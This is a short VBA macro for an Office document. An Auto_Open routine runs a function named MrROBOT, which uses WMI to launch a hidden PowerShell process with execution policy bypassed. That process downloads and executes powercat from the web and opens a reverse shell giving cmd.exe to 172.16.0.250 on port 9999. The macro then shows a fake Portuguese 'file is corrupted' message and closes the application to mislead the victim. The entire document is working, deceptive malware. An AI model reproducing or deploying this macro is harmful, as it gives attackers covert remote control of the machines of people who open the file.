Sub Auto_Open()
MrROBOT
End Sub

Public Function MrROBOT() As Variant
    Const HIDDEN_WINDOW = 0
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
    objProcess.Create "powershell -w hidden -ep bypass -nop -noexit -c ""IEX ((New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'))""; powercat -c 172.16.0.250 -p 9999 -e cmd.exe", Null, objConfig, intProcessID
    msg = "O arquivo está corrompido e não pode ser aberto."
intResponse = MsgBox(msg, 16, Title)
    Application.Quit
End Function
